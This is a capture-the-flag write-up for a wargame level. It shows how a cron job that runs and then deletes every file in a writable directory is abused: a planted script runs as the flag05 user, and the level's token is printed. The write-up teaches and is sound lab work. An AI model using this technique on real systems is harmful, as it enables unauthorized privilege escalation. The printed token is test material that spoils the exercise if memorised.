# Level05 Documentation

## Objective
Retrieve the token for `level06` by exploiting a cron job that executes scripts as `flag05`.

## Approach & Tools
- **Technique**: Cron job exploitation via writable directories.
- **Commands**: `find`, `cat`, `echo`, `chmod`.

## Step-by-Step Solution
When we login as level05 user we get ```You have new mail.```

### 1. Locate the mail file:
```bash
find / -name "mail" 2>/dev/null
```
Output:
```bash
/var/mail
```
Check mail contents:
```bash
ls /var/mail
level05
cat /var/mail/level05
```

#### output
```bash
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Runs /usr/sbin/openarenaserver as flag05 every 2 minutes.
### 2. Analyze the Cron Script
Inspect /usr/sbin/openarenaserver:
```bash
cat /usr/sbin/openarenaserver
```
#### output
```bash
#!/bin/sh
for i in /opt/openarenaserver/* ; do
  (ulimit -t 5; bash -x "$i")
  rm -f "$i"
done
```
Executes all files in ```/opt/openarenaserver/``` Deletes them afterward.

### 3. Exploit the Writable Directory

Create a Malicious Script:
```bash
echo 'getflag > /tmp/flag05' > /opt/openarenaserver/getflag
chmod +x /opt/openarenaserver/getflag

# Wait 2 Minutes for the cron job to execute your script.
cat /tmp/flag05
```

#### Output:
```bash
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
### Key Takeaways

* Check System Mail: The You have new mail prompt often indicates cron logs or system alerts.

* Cron Job Hygiene: Writable directories in cron-executed scripts are High risk vulnerability.

* Ephemeral Files: Use /tmp for output since /opt/openarenaserver/ gets purged.